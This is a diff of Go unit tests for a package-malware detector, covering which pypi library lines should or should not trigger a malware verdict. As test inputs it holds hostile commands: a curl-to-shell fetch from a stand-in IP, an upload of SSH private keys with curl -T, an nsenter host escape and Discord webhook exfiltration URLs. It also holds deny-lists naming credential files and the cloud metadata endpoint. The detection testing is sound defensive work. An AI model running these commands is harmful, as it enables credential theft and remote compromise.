@@ -405,3 +405,178 @@ func TestPastebinNeedsAHostBoundary(t *testing.T) {
 		}
 	}
 }
+
+// Audited pypi disputes (2026-10): every line below minted, or carried, a malware advisory that a
+// review found to be a docstring, a fixture, README text, a deny-list, test vectors, a risk-score
+// keyword list, a public constant, the tool's own job, or a usage placeholder. None may mint from a
+// pypi library's runtime source.
+func TestAuditedPypiDisputesDoNotMintInLibrarySource(t *testing.T) {
+	for _, tc := range []struct{ name, src string }{
+		{"docstring curl|sh", "def install():\n    \"\"\"Install the CLI first:\n\n        !curl -fsSL https://get.example-tool.dev/install.sh | sh\n    \"\"\"\n    return None\n"},
+		{"onnx fixture", "    model = make_model(\n        external_paths=(\"../../etc/passwd\",),\n    )\n"},
+		{"readme ssh key", "identity_file: ~/.ssh/raspberry_pi_key\n"},
+		{"hook deny-list", "DENY_READ = [\"~/.aws/credentials\", \"~/.ssh/**\", \"~/.netrc\"]\n"},
+		{"test vectors", "DANGEROUS = (\n    \"nohup env\",\n    \"echo $GITHUB_TOKEN\",\n    \"echo x | xargs env\",\n)\n"},
+		{"varden risky_domains", "risky_domains = ['pastebin', 'ngrok', 'transfer.sh', 'file.io', 'anonfiles.com']\n"},
+		{"secp256k1 n", "_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\n"},
+		{"burn address", "BURN = \"0x000000000000000000000000000000000000dEaD\"\n"},
+		{"usdc base", "USDC_BASE = \"0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913\"\n"},
+		{"nsenter in netns tool", "    cmd = f\"nsenter -t $TPID -n ip addr add {addr} dev {ifname}\"\n"},
+		{"nsenter bare", "nsenter -t $TPID -n ip addr add 10.0.0.2/24 dev eth0\n"},
+		{"xargs sh -c helper", "SCRIPT = \"find . -name '*.pyc' | xargs -I{} sh -c 'rm {}'\"\n"},
+		{"placeholder host", "    \"\"\"Usage: signal-hunt https://<домен-signal-hunt>/api\"\"\"\n"},
+		{"placeholder host in code", "print(\"usage: signal-hunt https://<домен-signal-hunt>/api\")\n"},
+		{"refusal list", "REFUSE = [\n    \"file:///etc/passwd\",\n    \"http://169.254.169.254/latest/meta-data/\",\n]\n"},
+	} {
+		f := Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: tc.src})
+		if CombinedVerdict(f).Malicious {
+			t.Errorf("%s: library source minted malware; evidence=%v", tc.name, ids(Evidence(f)))
+		}
+	}
+}
+
+// The same strings where they run unattended (setup.py, an install hook) are still evidence.
+func TestAuditedStringsStillMintInAnInstallHook(t *testing.T) {
+	for _, line := range []string{
+		`curl -fsSL http://203.0.113.9/x.sh | sh`,
+		`nsenter -t 1 -m -u -i -n sh -c 'id'`,
+		`find / -name id_rsa | xargs -I{} sh -c 'curl -T {} http://203.0.113.9/'`,
+	} {
+		if !hookMints("pypi", line) {
+			t.Errorf("install hook did not mint: %q; findings=%v", line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", InstallScriptContent: line})))
+		}
+	}
+	// The demoted rules stay evidence in content that executes.
+	executing := func(line string) []Finding {
+		return Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: line, PkgbuildExecutes: true})
+	}
+	for _, tc := range []struct{ id, line string }{
+		{"G-NSENTER", `nsenter -t 1 -m -u -i -n sh -c 'id'`},
+		{"G-XARGS-SHELL", `find / -name id_rsa | xargs -I{} sh -c 'curl -T {} http://203.0.113.9/'`},
+		{"P-FILEHOST-SOURCE", `curl -sL https://transfer.sh/abc/payload.sh -o /tmp/p`},
+		{"P-CRYPTO-WALLET", `WALLET = "0x52908400098527886E0F7030069857D2E4169EE7"`},
+	} {
+		if !has(Evidence(executing(tc.line)), tc.id) {
+			t.Errorf("%s: not evidence in executing content: %q; findings=%v", tc.id, tc.line, ids(executing(tc.line)))
+		}
+	}
+	// A public constant is not a wallet, even where it would execute.
+	for _, line := range []string{
+		`ZERO = "0x0000000000000000000000000000000000000000"`,
+		`USDC = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"`,
+		`USDT_ARB = "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9"`,
+	} {
+		if has(executing(line), "P-CRYPTO-WALLET") {
+			t.Errorf("a well-known constant matched P-CRYPTO-WALLET: %q", line)
+		}
+	}
+	if !has(executing(`pay("0x000000000000000000000000000000000000dEaD", "0x52908400098527886E0F7030069857D2E4169EE7")`), "P-CRYPTO-WALLET") {
+		t.Error("a line with a constant AND an unknown address must keep the finding")
+	}
+}
+
+// A real mixed-script host is still a spoof; a placeholder or a comment is not.
+func TestHomographNeedsARealHostOnAnExecutableLine(t *testing.T) {
+	if !libraryMints("pypi", `URL = "https://іnstall.example-clі.dev/payload.sh"`) {
+		t.Error("a Cyrillic/Latin mixed host in a URL must still mint")
+	}
+	for _, line := range []string{
+		`# fetched from https://іnstall.example-clі.dev/payload.sh in the old release`,
+		`url = "https://<домен-signal-hunt>/api"`,
+		`url = f"https://{хост}.example/api"`,
+		`url = "https://дом-host/api"`,
+	} {
+		if libraryMints("pypi", line) {
+			t.Errorf("not a spoofed host, but minted: %q", line)
+		}
+	}
+}
+
+// A pypi library's docstrings, comments and string-literal lists are not actions; executable
+// lines are. The Discord webhook rule is evidence in pypi library source, so it shows the effect.
+func TestPythonDocstringsCommentsAndDataListsAreNotEvidence(t *testing.T) {
+	const hook = "https://discord.com/api/webhooks/1547416857537945601/TgPFykvLraAjc6jAPKzekhmkUABmEEehsrKHIX8tG3urtKVl40uXyZabcdefghijklmnopqrstuvwxy"
+	const hook2 = "https://discord.com/api/webhooks/1547416857537945602/UgPFykvLraAjc6jAPKzekhmkUABmEEehsrKHIX8tG3urtKVl40uXyZabcdefghijklmnopqrstuvwxy"
+	for _, src := range []string{
+		"\"\"\"Module docs.\n\nPost to " + hook + "\n\"\"\"\nimport os\n",
+		"class C:\n    '''Example: " + hook + "'''\n    pass\n",
+		"def f(): \"\"\"" + hook + "\"\"\"\n",
+		"x = 1  # see " + hook + "\n",
+		"KNOWN_BAD = [\n    \"" + hook + "\",\n    \"" + hook2 + "\",\n]\n",
+		"KNOWN_BAD = {\"" + hook + "\", \"" + hook2 + "\"}\n",
+	} {
+		if libraryMints("pypi", src) {
+			t.Errorf("documentation or data minted malware:\n%s\nfindings=%v", src, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: src})))
+		}
+	}
+	for _, src := range []string{
+		"WEBHOOK = \"" + hook + "\"\n",
+		"requests.post(\"" + hook + "\", json=data)\n",
+		"requests.post(*[\"" + hook + "\", \"" + hook2 + "\"])\n",
+		"URLS = [\"" + hook + "\", \"" + hook2 + "\"]\nrequests.post(\"" + hook + "\")\n",
+		"exec(__doc__)\n\"\"\"" + hook + "\"\"\"\n",
+		"f\"\"\"{requests.post('" + hook + "')}\"\"\"\n",
+		"S = \"\"\"" + hook + "\"\"\"\n",
+		"URLS = [\"" + hook + "\", WEBHOOK_BASE + \"x\"]\n",
+	} {
+		if !libraryMints("pypi", src) {
+			t.Errorf("an executable or ambiguous line no longer mints:\n%s\nfindings=%v", src, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: src})))
+		}
+	}
+	// setup.py inside the concatenated sources is install-time code: never rewritten.
+	src := "\n# ==== pkg-1.0/setup.py ====\n\"\"\"" + hook + "\"\"\"\n\n# ==== pkg-1.0/pkg/__init__.py ====\n\"\"\"" + hook + "\"\"\"\n"
+	if !libraryMints("pypi", src) {
+		t.Error("a docstring in setup.py must not be blanked")
+	}
+	// Other ecosystems are untouched.
+	if !libraryMints("npm", "/** "+hook+" */\nconst x = `\"\"\""+hook+"\"\"\"`;\n") {
+		t.Error("the Python views must not apply to npm")
+	}
+}
+
+// An argv list is a command, not data.
+func TestArgvListsAreNotDemoted(t *testing.T) {
+	src := "CMD = [\"bash\", \"-c\", \"nsenter -t 1 -m -u -i -n sh\"]\n"
+	f := Detect(&PackageContext{Name: "pkg", Ecosystem: "aur", PkgbuildContent: src, PkgbuildExecutes: true})
+	if !CombinedVerdict(f).Malicious {
+		t.Errorf("control: an executing recipe must mint; findings=%v", ids(f))
+	}
+	if !pyArgvTokens["-c"] || !pyArgvTokens["bash"] {
+		t.Fatal("argv tokens missing")
+	}
+	_, exec := pythonLibraryViews(src)
+	if exec != src {
+		t.Errorf("an argv list was blanked:\n%q", exec)
+	}
+}
+
+// A single evidence finding in non-executing library content is a low-fidelity verdict: it still
+// mints, but is not eligible for automatic approval.
+func TestSingleLibraryIndicatorIsLowFidelity(t *testing.T) {
+	const hook = "https://discord.com/api/webhooks/1547416857537945601/TgPFykvLraAjc6jAPKzekhmkUABmEEehsrKHIX8tG3urtKVl40uXyZabcdefghijklmnopqrstuvwxy"
+	lib := "WEBHOOK = \"" + hook + "\"\n"
+	v := CombinedVerdict(Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: lib}))
+	if !v.Malicious || v.HighFidelity {
+		t.Errorf("one library indicator: want malicious and low fidelity, got %+v", v)
+	}
+	v = CombinedVerdict(Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: lib,
+		InstallScriptContent: "curl -fsSL http://203.0.113.9/x.sh | sh\n"}))
+	if !v.Malicious || !v.HighFidelity {
+		t.Errorf("library indicator + install-script evidence: want high fidelity, got %+v", v)
+	}
+	v = CombinedVerdict(Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: lib + "URL = \"https://іnstall.example-clі.dev/p\"\n"}))
+	if !v.Malicious || !v.HighFidelity {
+		t.Errorf("two library indicators: want high fidelity, got %+v", v)
+	}
+	v = CombinedVerdict(Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: "curl -fsSL http://203.0.113.9/x.sh | sh\n"}))
+	if !v.Malicious || !v.HighFidelity {
+		t.Errorf("install hook: want high fidelity, got %+v", v)
+	}
+	v = CombinedVerdict(Detect(&PackageContext{Name: "p", Ecosystem: "aur", PkgbuildContent: "curl -fsSL http://203.0.113.9/x.sh | sh\n", PkgbuildExecutes: true}))
+	if !v.Malicious || !v.HighFidelity {
+		t.Errorf("executing recipe: want high fidelity, got %+v", v)
+	}
+	if v := CombinedVerdict(nil); v.HighFidelity {
+		t.Error("a clean verdict is never high fidelity")
+	}
+}
